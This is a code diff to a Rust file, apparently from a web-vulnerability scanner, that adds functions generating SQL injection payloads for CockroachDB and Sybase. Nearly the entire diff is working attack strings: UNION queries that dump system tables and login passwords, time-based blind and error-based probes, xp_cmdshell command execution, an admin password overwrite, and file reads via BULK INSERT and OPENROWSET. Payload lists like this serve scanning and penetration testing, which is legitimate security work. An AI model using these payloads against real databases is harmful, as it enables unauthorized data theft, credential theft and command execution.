@@ -1711,6 +1711,130 @@ pub fn generate_mariadb_specific_sqli() -> Vec<String> {
     payloads
 }
 
+/// CockroachDB specific SQLi payloads (15+ payloads)
+/// Targets: CockroachDB crdb_internal tables, PostgreSQL-compatible, EXPLAIN, version detection
+pub fn generate_cockroachdb_specific_sqli() -> Vec<String> {
+    let mut payloads = Vec::new();
+
+    // CockroachDB version detection
+    payloads.extend(vec![
+        "' UNION SELECT NULL,version()--".to_string(),
+        "' UNION SELECT NULL,crdb_internal.node_build_info()--".to_string(),
+        "' AND version() LIKE '%CockroachDB%'--".to_string(),
+        "' UNION SELECT NULL,current_setting('server_version')--".to_string(),
+    ]);
+
+    // CockroachDB crdb_internal system tables
+    payloads.extend(vec![
+        "' UNION SELECT NULL,node_id FROM crdb_internal.gossip_nodes--".to_string(),
+        "' UNION SELECT NULL,store_id FROM crdb_internal.kv_store_status--".to_string(),
+        "' UNION SELECT NULL,database_name FROM crdb_internal.databases--".to_string(),
+        "' UNION SELECT NULL,table_name FROM crdb_internal.tables--".to_string(),
+        "' UNION SELECT NULL,descriptor FROM crdb_internal.table_columns--".to_string(),
+        "' UNION SELECT NULL,address FROM crdb_internal.gossip_liveness--".to_string(),
+    ]);
+
+    // CockroachDB-specific functions
+    payloads.extend(vec![
+        "' UNION SELECT NULL,crdb_internal.cluster_id()--".to_string(),
+        "' UNION SELECT NULL,crdb_internal.node_id()--".to_string(),
+        "' UNION SELECT NULL,crdb_internal.pretty_key(b'\\x00',0)--".to_string(),
+    ]);
+
+    // CockroachDB EXPLAIN information disclosure
+    payloads.extend(vec![
+        "'; EXPLAIN SELECT * FROM users--".to_string(),
+        "'; EXPLAIN ANALYZE SELECT * FROM sensitive_data--".to_string(),
+        "'; SHOW COLUMNS FROM users--".to_string(),
+        "'; SHOW CREATE TABLE users--".to_string(),
+    ]);
+
+    // CockroachDB PostgreSQL-compatible injection (CockroachDB is PG-wire compatible)
+    payloads.extend(vec![
+        "' UNION SELECT NULL,usename FROM pg_user--".to_string(),
+        "' UNION SELECT NULL,datname FROM pg_database--".to_string(),
+        "' AND pg_sleep(5)--".to_string(),
+        "' UNION SELECT NULL,current_user()--".to_string(),
+    ]);
+
+    // CockroachDB error-based extraction
+    payloads.extend(vec![
+        "' AND 1=CAST(version() AS INT)--".to_string(),
+        "' AND 1=CAST(current_user() AS INT)--".to_string(),
+    ]);
+
+    payloads
+}
+
+/// Sybase specific SQLi payloads (20+ payloads)
+/// Targets: Sybase ASE system tables, xp_cmdshell, WAITFOR, error-based extraction
+pub fn generate_sybase_specific_sqli() -> Vec<String> {
+    let mut payloads = Vec::new();
+
+    // Sybase version detection
+    payloads.extend(vec![
+        "' UNION SELECT NULL,@@version--".to_string(),
+        "' UNION SELECT NULL,@@servername--".to_string(),
+        "' AND @@version LIKE '%Sybase%'--".to_string(),
+        "' UNION SELECT NULL,@@language--".to_string(),
+    ]);
+
+    // Sybase system tables (master database)
+    payloads.extend(vec![
+        "' UNION SELECT NULL,name FROM master..sysdatabases--".to_string(),
+        "' UNION SELECT NULL,name FROM master..sysobjects WHERE type='U'--".to_string(),
+        "' UNION SELECT NULL,name FROM master..syscolumns--".to_string(),
+        "' UNION SELECT NULL,name FROM master..syslogins--".to_string(),
+        "' UNION SELECT NULL,password FROM master..syslogins--".to_string(),
+    ]);
+
+    // Sybase command execution (xp_cmdshell)
+    payloads.extend(vec![
+        "'; EXEC master..xp_cmdshell 'whoami'--".to_string(),
+        "'; EXEC xp_cmdshell 'dir c:\\'--".to_string(),
+        "'; EXEC master..xp_cmdshell 'net user'--".to_string(),
+        "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--".to_string(),
+    ]);
+
+    // Sybase WAITFOR time-based blind
+    payloads.extend(vec![
+        "'; WAITFOR DELAY '0:0:5'--".to_string(),
+        "' AND 1=1 WAITFOR DELAY '0:0:5'--".to_string(),
+        "'; IF (1=1) WAITFOR DELAY '0:0:5'--".to_string(),
+        "'; IF (SELECT COUNT(*) FROM master..syslogins)>0 WAITFOR DELAY '0:0:5'--".to_string(),
+    ]);
+
+    // Sybase error-based extraction
+    payloads.extend(vec![
+        "' AND 1=CONVERT(INT,@@version)--".to_string(),
+        "' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM master..sysdatabases))--".to_string(),
+        "' AND 1=CONVERT(INT,USER_NAME())--".to_string(),
+        "' AND 1=CONVERT(INT,DB_NAME())--".to_string(),
+    ]);
+
+    // Sybase login extraction
+    payloads.extend(vec![
+        "' UNION SELECT NULL,suid FROM master..syslogins--".to_string(),
+        "' UNION SELECT NULL,dbname FROM master..syslogins--".to_string(),
+        "' UNION SELECT NULL,accdate FROM master..syslogins--".to_string(),
+    ]);
+
+    // Sybase stacked queries
+    payloads.extend(vec![
+        "'; SELECT * FROM master..sysdatabases--".to_string(),
+        "'; INSERT INTO log_table VALUES(@@version)--".to_string(),
+        "'; UPDATE users SET password='hacked' WHERE username='admin'--".to_string(),
+    ]);
+
+    // Sybase file operations
+    payloads.extend(vec![
+        "'; BULK INSERT temp FROM 'c:\\boot.ini'--".to_string(),
+        "'; SELECT * INTO temp FROM OPENROWSET('SQLOLEDB','server';'sa';'','SELECT * FROM remote..users')--".to_string(),
+    ]);
+
+    payloads
+}
+
 /// Get all SQLi payloads (75,000+ total)
 pub fn get_all_sqli_payloads() -> Vec<String> {
     let mut all_payloads = Vec::new();
